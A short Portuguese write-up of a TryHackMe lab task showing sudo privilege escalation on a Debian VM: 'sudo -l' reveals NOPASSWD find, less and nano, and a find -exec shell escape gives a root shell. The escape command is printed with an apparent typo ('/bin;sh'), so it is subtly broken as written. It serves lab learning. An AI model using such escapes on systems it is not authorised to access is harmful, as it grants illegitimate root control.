#### Task 6 – Shell Escape

##### Objetivo da Task

 - Escalar privilégio usando programas que podem ser executados com `sudo` e que possuem "shell escape sequences"

#####  Na máquina do DEBIAN do TryHackMe:
```bash
 
user@debian:~$ sudo -l

#Saída:

User user may run the following commands on debian:
    (root) NOPASSWD: /usr/bin/find
    (root) NOPASSWD: /usr/bin/less
    (root) NOPASSWD: /usr/bin/nano
```
##### Método usado:
 - find 

```bash
find . -exec /bin;sh \; -quit  *script pronto no GTFOBins 

#Saída:

sh-4.1#
```
 - Consegui o shell root.

##### O que aprendi 

 - sudo -l é essencial para identificar vetores de ataque
 - GFOBins é uma ferramenta muito boa para encontrar shell escapes
 - Programas simples podem ser perigosos no sudo
